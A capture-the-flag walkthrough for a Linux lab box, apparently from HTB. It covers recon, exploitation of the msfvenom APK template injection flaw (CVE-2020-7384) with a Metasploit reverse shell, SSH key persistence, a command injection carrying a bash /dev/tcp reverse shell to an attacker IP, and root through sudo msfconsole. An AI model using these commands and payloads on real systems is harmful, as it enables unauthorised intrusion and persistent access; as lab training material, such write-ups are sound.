## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)](Easy)

---

## 🔍 Recon
```bash
nmap -sV -sC -oA scans/nmap-alltcp 10.10.10.226
```
- **Open Ports:**
  - 22 (SSH)
  - 5000 ([HTTP](HTTP.md) - Werkzeug server)

```bash
gobuster dir -u http://10.10.10.226:5000/ -w /usr/share/dirb/wordlists/small.txt
```

---

## 🕵️ Exploitation - CVE-2020-7384 (APK Template Injection)
### Description:
- Exploits `msfvenom` APK template injection vulnerability
- Vulnerable webapp allows APK creation with arbitrary commands

### Metasploit Module
```bash
use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
```
- Set payload:
```bash
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 10.10.14.6
set LPORT 9001
set SRVHOST 10.10.14.6
```
- Run:
```bash
exploit
```
- Upload APK via web UI ➝ get shell back

---

## ⚙️ Initial Foothold Shell
### Reverse Shell Upgrade
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
reset
export TERM=xterm-256color
```

### [SSH](SSH) Persistence (Optional)
```bash
mkdir ~/.ssh
echo "<your public key>" > ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

---

## 👀 Enumeration - User Privilege Escalation
### Hacker Submission Injection
```bash
echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.6/9002 0>&1' # ." > logs/hackers
```
- Triggers a reverse shell as the next user

---

## 🔒 Root Privilege Escalation
### Sudo Permissions Check
```bash
sudo -l
```
- Allowed: `/opt/metasploit-framework-6.0.9/msfconsole` without password

### Exploit
```bash
sudo /opt/metasploit-framework-6.0.9/msfconsole
```
- Within msfconsole:
```bash
!bash
```
- Gain root shell

---

## 🔑 Flags
```bash
cat /home/kiddie/user.txt
cat /root/root.txt
```

---

## 📂 Resources
- [Exploit-DB CVE-2020-7384](https://www.exploit-db.com/exploits/49445)
- [Rapid7 Module: metasploit_msfvenom_apk_template_cmd_injection](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/)
